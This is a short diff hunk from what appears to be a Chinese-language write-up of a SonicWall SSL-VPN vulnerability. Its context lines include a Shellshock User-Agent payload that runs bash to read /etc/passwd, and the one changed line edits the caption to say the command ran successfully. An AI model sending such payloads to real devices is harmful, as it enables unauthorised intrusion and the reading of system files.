@@ -23,7 +23,7 @@ SonicWall SSL-VPN < 8.0.0.4
 ```
 User-Agent: () { :; }; echo ; /bin/bash -c 'cat /etc/passwd'
 ```
-如下图
+成功执行命令，如下图
 ![image](./0.png)
 
 # 0x05 批量脚本
